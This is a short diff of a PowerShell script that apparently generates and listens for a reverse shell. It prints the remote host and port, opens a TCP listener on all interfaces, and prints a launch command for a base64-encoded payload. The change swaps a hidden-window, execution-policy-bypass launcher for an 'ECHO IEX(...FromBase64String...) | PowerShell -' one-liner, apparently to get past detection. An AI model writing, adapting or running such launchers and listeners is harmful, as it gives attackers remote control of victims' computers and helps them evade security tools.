@@ -55,7 +55,7 @@ Write-Host $ASCII;
 Write-Host "`n - Remote Port:"$Port"";
 Write-Host " - Remote Host:"$IP"";
 Write-Host "`n [*] Payload: [*]";
-Write-Host "`nPowerShell -noP -nol -Win hidden -nonI -Exe ByPass -en $Base64Payload";
+Write-Host "`nECHO IEX([string]([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String({$Base64Payload}))));Exit | PowerShell -";
 Write-Host "`n [*] Listeneing on Port `"$Port`" [*]";
 $Socket = New-Object System.Net.Sockets.TcpListener('0.0.0.0', $Port);
 $Socket.Start();
